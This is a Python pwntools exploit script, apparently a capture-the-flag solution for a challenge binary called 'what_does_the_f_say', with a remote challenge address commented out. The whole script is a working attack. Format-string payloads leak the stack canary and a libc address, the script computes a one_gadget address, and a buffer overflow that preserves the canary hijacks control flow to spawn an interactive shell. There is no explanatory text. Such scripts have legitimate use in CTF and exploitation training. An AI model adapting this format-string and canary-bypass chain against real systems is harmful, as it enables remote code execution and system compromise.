from pwn import *

#r = remote("167.71.142.156" ,31968)
r = process("./what_does_the_f_say_patched")
e = ELF("./what_does_the_f_say")
r.sendlineafter('2. Space food\n' ,'1')
r.sendlineafter('3. Deathstar(70.00 s.rocks)\n' ,'2')
exploit = b"%13$p"
r.sendafter('\nRed or Green Kryptonite?\n' ,exploit)
canary_leak = r.recvuntil(b"00")
canary_leak = str(canary_leak)
canary_leak = canary_leak.replace("b'","")
canary_leak = canary_leak.replace("'","")
canary_leak = int(canary_leak,16)
print("Cnaray leak: ",hex(canary_leak))
r.sendlineafter('2. Space food\n' ,'1')
r.sendlineafter('3. Deathstar(70.00 s.rocks)\n' ,'2')
exploit = b"%25$p"
r.sendafter('\nRed or Green Kryptonite?\n' ,exploit)
libc_leak = r.recvuntil(b"b97")
libc_leak = str(libc_leak)
libc_leak = libc_leak.replace("b'","")
libc_leak = libc_leak.replace("'","")
libc_leak = int(libc_leak,16)
libc_base = libc_leak - 0x21b97
print("libc leak: ",hex(libc_leak))
print("libc base: ",hex(libc_base))
one_gadget = libc_base + 0x4f3c2
print("one gadget: ",hex(one_gadget))
for i in range(0,5):
    r.sendlineafter('2. Space food\n', '2')
    r.sendlineafter('3. Spacecream (7.90 s.rocks) \n' ,'3')
r.sendlineafter('2. Space food\n' ,'1')
r.sendlineafter('3. Deathstar(70.00 s.rocks)\n' ,'2')
exploit = b"Red"
r.sendafter('\nRed or Green Kryptonite?\n' ,exploit)
rop_chain = p64(one_gadget) + p64(0) * 10
exploit = b"A" *24 + p64(canary_leak) + b"A" * 8 + rop_chain
r.sendline(exploit)
r.interactive()
